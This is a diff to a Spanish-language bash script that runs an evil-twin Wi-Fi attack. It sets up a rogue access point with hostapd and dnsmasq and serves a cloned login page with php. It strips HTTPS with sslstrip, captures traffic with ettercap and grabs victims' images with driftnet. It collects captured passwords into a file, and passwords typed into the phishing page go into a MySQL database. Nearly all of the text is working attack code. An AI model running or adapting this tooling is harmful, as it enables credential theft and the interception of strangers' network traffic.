@@ -92,7 +92,6 @@ function getCredentials(){
 }
 
 mkdir -p /tmp/Wifi
-mkdir -p /home/kali/Desktop/ap_falso
 sleep  1
     clear; if [[ -e credenciales.txt ]]; then
         rm -rf credenciales.txt
@@ -145,8 +144,8 @@ sleep  1
     echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando interfaz $choosed_interface${endColour}\n"
     sleep 2
     echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
-    gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; hostapd hostapd.conf > /dev/null 2>&1 ; $SHELL"
-    # hostapd hostapd.conf > /dev/null 2>&1 &
+#    gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; hostapd hostapd.conf ; $SHELL"
+    hostapd hostapd.conf > /dev/null 2>&1 &
     sleep 6
 
     echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}"
@@ -164,8 +163,8 @@ sleep  1
     sleep 1
     route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
     sleep 1
-    gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 ; $SHELL"
-    # dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
+#    gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; dnsmasq -C dnsmasq.conf -d ; $SHELL"
+    dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
     sleep 5
 clear
 
@@ -191,8 +190,8 @@ clear
 echo -e "${GREEN}"
 
 if [ "$AIRBASE" = "1" ]; then
-echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}\n"; sleep 1
-pushd colorlib1.com > /dev/null 2>&1
+echo -e "\n${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} colorlib${endColour}\n"; sleep 1
+pushd colorlib > /dev/null 2>&1
 php -S 192.168.1.1:80 > /dev/null 2>&1 &
 sleep 2
 popd > /dev/null 2>&1; # getCredentials
@@ -200,16 +199,17 @@ popd > /dev/null 2>&1; # getCredentials
 # rm -rf /var/www/html
 # mkdir -p /var/www/html
 # httrack https://colorlib.com/etc/lf/Login_v5/index.html -O /var/www/html
+mkdir -p $HOME/Wifi
 
 # Sslstrip
 echo
-echo -e "${yellowColour}[*]${endColour}${grayColour}Iniciando sslstrip...${endColour}" 
+echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando sslstrip...${endColour}\n" 
 
-sslstrip -f -p -k -l 10000 -w /$HOME/Wifi/sslstrip.log & sslstripid=$!
+sslstrip -f -p -k -l 10000 -w $HOME/Wifi/sslstrip.log & sslstripid=$!
 sleep 2
 
 # Ettercap
-echo -e "${yellowColour}[*]${endColour}${grayColour}Iniciando ettercap...${endColour}"
+echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando ettercap...${endColour}\n"
 
 gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; ettercap -p -u -T -q -w /tmp/Wifi/etter.cap -i wlan0mon & ettercapid=$! ; $SHELL"
 
@@ -217,7 +217,7 @@ gnome-terminal -- bash -c "echo 'Ejecutando comando en nueva terminal...' ; ette
 sleep 2
 
 # Driftnet
-echo -e "${yellowColour}[*]${endColour}${grayColour}Iniciando driftnet...${endColour}"
+echo -e "\n${yellowColour}[*]${endColour}${grayColour}Iniciando driftnet...${endColour}\n"
 
 mkdir -p "/tmp/Wifi/Images_$(date +%d%m%y)"
 driftnet -i wlan0mon -a -d /tmp/Wifi/Images_$(date +%d%m%y) > /dev/null & dritnetid=$!
@@ -235,8 +235,8 @@ echo
 echo -e "\n${yellowColour}[*]${endColour}${redColour} Después de haber terminado, por favor cierre la herramiente y limpie correctamente golpeando cualquier tecla.${endColour}${grayColour})...${endColour}\n${endColour}"
 
 read junk
+
 echo
-mkdir -p $HOME/
 # copiado de contraseñas obtenidas para ser guardadas
 count=$(grep -c "Referer" /tmp/Wifi/etter.cap)
 for i in $(seq 1 $count) 
@@ -246,28 +246,25 @@ do
 done
 
 if [ -f "$HOME/Wifi/passwords.txt" ]; then
-   echo $GREEN "Contraseñas Guardadas !"
+    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Contraseñas Guardadas !\n${endColour}"
 else
-   echo $RED "Error al guardar contraseñas"
+    echo -e "\n${redColour}[*]${endColour}${grayColour} Error al guardar contraseñas !\n${endColour}"
 fi
 
 cp -rf /tmp/Wifi/Images_$(date +%d%m%y) $HOME/Wifi
 if [ -d "$HOME/Wifi/Images_$(date +%d%m%y)" ]; then
-   echo $GREEN "Imagenes Guardadas !"
+    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Imágenes Guardadas !\n${endColour}"
 else
-   echo $RED "Error al guardar contraseñas"
+    echo -e "\n${redColour}[*]${endColour}${grayColour} Error al guardar imágenes !\n${endColour}"
 fi
 
 cp -rf /tmp/Wifi/etter.cap $HOME/Wifi
 if [ -f "$HOME/Wifi/etter.cap" ]; then
-   echo $GREEN "Captura de Archivo Guardada !"
+    echo -e "\n${yellowColour}[*]${endColour}${grayColour} Captura de Archivo Guardada !\n${endColour}"
 else
-   echo $RED "Error al capturar el archivo"
+    echo -e "\n${redColour}[*]${endColour}${grayColour} Error al capturar el archivo !\n${endColour}"
 fi
 
-kill ${sslstripid} &> /dev/null
-kill ${ettercapid} &> /dev/null
-kill ${dritnetid} &> /dev/null
     
     echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Exiting...\n${endColour}"
     rm dnsmasq.conf hostapd.conf 2>/dev/null
@@ -277,7 +274,10 @@ kill ${dritnetid} &> /dev/null
     iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
     ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
     tput cnorm; service network-manager restart
-    exit 0
+
+kill ${sslstripid} &> /dev/null
+kill ${ettercapid} &> /dev/null
+kill ${dritnetid} &> /dev/null
 
 fi
 # SEGUNDA PARTE de pagina web
@@ -303,12 +303,10 @@ if [ "$AIRBASE" = "0" ]; then
 
 
 # Informa al usuario que la página ha sido creada
-echo "Página web creada con éxito en http://10.0.0.1/"
-
-
 sleep 2
 #ejecuta el script de la base de datos
-source bbdd.sh
+source utilities/bbdd.sh 
+echo "Página web creada con éxito en http://10.0.0.1/"
 
 sleep 2
 
@@ -317,7 +315,7 @@ echo $YELLOW
 echo "Todas las contraseñas que sean introducidas en esta página web seran guardadas en una base de datos"
 echo
 echo -e "Para acceder a las contraseñas almacenadas dentro de la base de datos $DB_NAME
-   ${purpleColour}1.- mysql
+   ${purpleColour} 1.- mysql
     2.- USE $DB_NAME;
     3.- SELECT * FROM usuario;${endColour}"
 echo
@@ -332,7 +330,6 @@ read junk
     iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
     ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > /dev/null 2>&1; sleep 1
     tput cnorm; service network-manager restart
-    exit 0
 fi
 
 
